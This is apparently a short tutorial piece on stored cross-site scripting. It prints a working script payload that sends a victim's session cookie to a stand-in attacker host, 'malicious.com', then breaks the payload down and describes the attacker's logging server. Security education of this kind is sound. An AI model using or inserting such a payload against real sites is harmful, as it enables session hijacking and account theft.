Malicious Script for Cookie Theft

This payload demonstrates how an attacker can use Stored XSS to exfiltrate a victim's session cookie to a server they control. It's a classic example of session hijacking preparation.

<script>  var img = new Image();  img.src = "https://malicious.com/steal?cookie=" + encodeURIComponent(document.cookie);</script>
Key Takeaway

XSS payloads can be simple yet highly effective, leveraging standard browser functionalities like image loading to transmit sensitive data to an attacker.

Payload Breakdown

  • `<script>...</script>`: Defines the malicious JavaScript block.
  • `new Image()`: Creates an image object, often used for 'beaconing' data.
  • `document.cookie`: Accesses the victim's session cookies.
  • `encodeURIComponent()`: Ensures cookie data is safely embedded in the URL.

Attacker's Perspective

The attacker sets up a simple server (e.g., `log.php`) to capture incoming GET requests. When a victim's browser loads the malicious image, the server logs the full URL, including the stolen cookie, allowing the attacker to retrieve it.

Pro Tip

Always test your XSS payloads in a controlled environment to understand their behavior and impact without causing harm.
